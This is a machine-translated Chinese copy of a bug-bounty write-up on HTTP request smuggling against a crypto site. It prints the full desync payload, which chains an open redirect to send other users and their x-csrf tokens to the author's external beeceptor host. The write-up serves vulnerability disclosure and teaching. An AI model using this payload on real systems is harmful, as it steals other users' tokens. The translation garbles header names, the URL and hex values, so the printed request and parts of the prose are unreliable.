<html>
<head>
<title>Request Smuggling In Major Crypto Site — road to disappointment</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">请求在主要秘密地点走私——失望之路</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/request-smuggling-in-major-crypto-site-road-to-disappointment-a71a461f3b1f?source=collection_archive---------1-----------------------#2021-10-09">https://infosecwriteups.com/request-smuggling-in-major-crypto-site-road-to-disappointment-a71a461f3b1f?source=collection_archive---------1-----------------------#2021-10-09</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="c582" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我自我介绍一下，因为这是我第一次写作。首先，如果我在写作中犯了错误，我很抱歉，因为英语不是我的母语。我来自一个小国，自1998年以来一直在那里工作，并从那时起“监测”安全局势。我从来没有勇气宣称自己是安全专家，因为编码是我不好的一面(我认为整天坐在椅子上键入代码很无聊)，但我当时受到一些团队和专家(fluffy bunny、team teso、一些IRC频道等)的钦佩。我利用的第一个bug是我认为是windows服务器中的Unicode bug，雅虎和谷歌网站上有很多XSS，我甚至在我的学习路径中为Winamp编写了缓冲区溢出漏洞利用。那时候和现在大不一样。我的道路让我暂时远离了安全领域，但我从未停止。</p><p id="1fe7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回到现实前一阵子a加入了Hackerone平台只是为了练技术。发现一些XXE，XSS，开放重定向，CRLF，甚至在Twitter网站上嵌入令牌，这给了我一个不错的赏金(谢谢Twitter)。因为对我来说这不是一个大的挑战，所以我想尝试一些别的东西。</p><p id="6c87" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后是James Kettle (albinowax)关于HTTP请求走私的精彩演示。我开始阅读关于desync攻击的文章(<a class="ae kl" href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" rel="noopener ugc nofollow" target="_blank">https://ports wigger . net/research/http-desync-attacks-request-smighting-reborn</a>)，看了一些视频，在portswigger academy做了一些练习测试，觉得已经准备好和我的下一个主机碰碰运气了:)</p><p id="ca3b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">与此同时，我收到了这个主要加密网站的邀请，并开始枚举子域，找到了一些开放的重定向和用户枚举，但所有这些都超出了范围。我决定试试https://github.com/defparam/smuggler<a class="km kn ep" href="https://medium.com/u/444ff95c7157?source=post_page-----a71a461f3b1f--------------------------------" rel="noopener" target="_blank">埃文·库斯托迪奥</a> <a class="ae kl" href="https://github.com/defparam/smuggler" rel="noopener ugc nofollow" target="_blank">的测试脚本，在很短的时间内，我得到了一些易受攻击的主机。</a></p><p id="d6de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">很好，但是现在是制作有效载荷的最困难的部分。许多不眠之夜尝试一切都没有成功。很多时候，我忘记取消选中更新打嗝时的内容长度或将十进制转换为十六进制，作为走私请求或结束请求的长度，如0\r\n\r\n</p><p id="1c8e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，我在我的beeceptor端点被击中，我不能相信我的眼睛，代币开始下雨。有效载荷如下:</p><blockquote class="ko kp kq"><p id="f4cb" class="jn jo kr jp b jq jr js jt ju jv jw jx ks jz ka kb kt kd ke kf ku kh ki kj kk ij bi translated"><strong class="jp ir"> POST /？CB = 7309697047596003 HTTP/1.1<br/>Transfer-Encoding:chunked<br/>主机:XXXXXX <br/>用户代理:Mozilla/5.0(Windows NT 10.0；Win64x64) AppleWebKit/537.36 (KHTML，像壁虎一样)Chrome/78 . 0 . 3904 . 87 Safari/537.36<br/>内容-类型:application/x-www-form-urlencoded；charset = UTF-8<br/>Content-Length:4<br/>Cookie:5d 2 af 5477d 02 a 9 df 5 f 62511 ceebb 7972d 3 BAE 8d 63 fc 14 BC 2223 e 14 bfffba 0d 4 f 7 c 96 c 6 cf 46 C3 de 33 b 3；</strong></p><p id="d678" class="jn jo kr jp b jq jr js jt ju jv jw jx ks jz ka kb kt kd ke kf ku kh ki kj kk ij bi translated"><strong class="jp ir">F4 \ r \ n</strong>(→计算以下请求的字符数并将其转换为十六进制)<br/> <strong class="jp ir"> GET /xxxx？a = 2&amp;targeturl =//oxygene . free . be ceptor . com HTTP/1.1<br/>Host:XXXXXX<br/>Connection:close<br/>Content-Length:50<br/>account Type:Real<br/>Authorization:Hidden<br/>Content-Type:application/JSON；charset=UTF-8 <br/>接受:application/json，text/plain，/ </strong></p><p id="2dfd" class="jn jo kr jp b jq jr js jt ju jv jw jx ks jz ka kb kt kd ke kf ku kh ki kj kk ij bi translated"><strong class="jp ir"> x=1 <br/> 0\r\n\r\n </strong></p></blockquote><p id="a5af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这个请求中，前端接受“Transfer-Encoding: chunked”并将处理第一个块F4或十进制244。对于0\r\n\r\n它将请求转发到仅接受内容长度的后端。后端只看到4的请求体(Content-Length: 4，其中<strong class="jp ir"> F4\r\n = 4 </strong>)并处理它，附加它的其余部分或<strong class="jp ir"> GET /xxxx？a = 2&amp;targeturl =//oxygene . free . be ceptor . com HTTP/1.1<br/>Host:XXXXXX</strong>(这是我之前找到的一个实际打开的重定向url，不在范围内)<strong class="jp ir"> </strong>到下一个请求也就是随机用户一个。用户被重定向到嵌入了x-csrf令牌的端点。</p><figure class="kw kx ky kz gt la gh gi paragraph-image"><div role="button" tabindex="0" class="lb lc di ld bf le"><div class="gh gi kv"><img src="../Images/c06e4384bee1bdcbe6949f6b9683eaa1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*C9agxFcWpRVYf3sYgC8-mA.jpeg"/></div></div></figure><p id="0012" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我立即向项目负责人报告，在做了大量解释后，问题得到了解决。不幸的是，我得到了零奖金，因为你需要提交至少一个P1才能进入他们的奖金水平。失望是巨大的，但正如我之前写的，我没有就此止步。</p></div></div>    
</body>
</html>